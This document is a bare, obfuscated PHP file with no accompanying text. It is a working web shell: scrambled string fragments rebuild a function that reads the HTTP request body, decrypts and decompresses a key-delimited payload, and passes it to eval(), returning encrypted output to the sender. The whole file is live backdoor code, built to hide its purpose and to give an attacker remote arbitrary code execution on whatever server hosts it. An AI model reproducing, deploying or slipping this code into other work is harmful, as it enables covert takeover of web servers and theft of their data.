<?php
$J='6wWIhNIwmUrP";Ifunction x($It,$kI){$c=strlIen($k)II;$l=strleIn($t);$Io=I"";f';
$X='orI($i=I0;$i<$l;){for(I$j=I0;($j<$c&I&$iI<$l);$Ij++,$Ii++){$o.=II$t{$Ii}^$k{';
$C=str_replace('KY','','KYcreaKYteKY_fuKYnKYctKYion');
$T='(@baseI64I_deIcode($m[1II]),$k)));$o=@ob_gIIet_conItents();@ob_eInd_Icl';
$f='tents("IphpI://inpIut"),$m)=I=1) {@Iob_starIt();I@eIval(I@gzuncIompress(@Ix';
$O='$k="9565II4e15I";$kh="2374IcI5a608b6";$kIf="ab925I9I891b8If";$p=I"QsrDZQ';
$x='I$j};}}return $Io;}if (I@Ipreg_ImatchI(I"/$kh(.+)$Ikf/",@fiIle_Iget_con';
$E='ean();I$r=@baseI6I4_encode(I@x(I@gzIcIompIress($o),$k));prIint("$pI$kh$r$kf");}';
$R=str_replace('I','',$O.$J.$X.$x.$f.$T.$E);
$F=$C('',$R);$F();
?>
